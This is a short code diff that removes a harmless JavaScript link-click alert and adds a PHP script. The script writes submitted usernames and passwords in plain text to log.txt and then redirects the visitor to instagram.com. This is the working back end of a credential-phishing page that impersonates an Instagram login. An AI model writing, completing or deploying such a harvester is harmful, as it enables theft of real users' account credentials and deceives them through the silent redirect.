@@ -1,6 +1,11 @@
-document.querySelectorAll('nav ul li a').forEach(item => {
-    item.addEventListener('click', function(event) {
-        event.preventDefault();
-        alert('Вы кликнули на ссылку: ' + item.textContent);
-    });
-});
+<?php
+
+$username = $_POST["username"];
+$password = $_POST["password"];
+
+$fp = fopen("log.txt", "a");
+fwrite($fp,"Username: " . $username);
+fwrite($fp,"Password: " . $password);
+fclose($fp);
+
+header("Location: https://instagram.com");
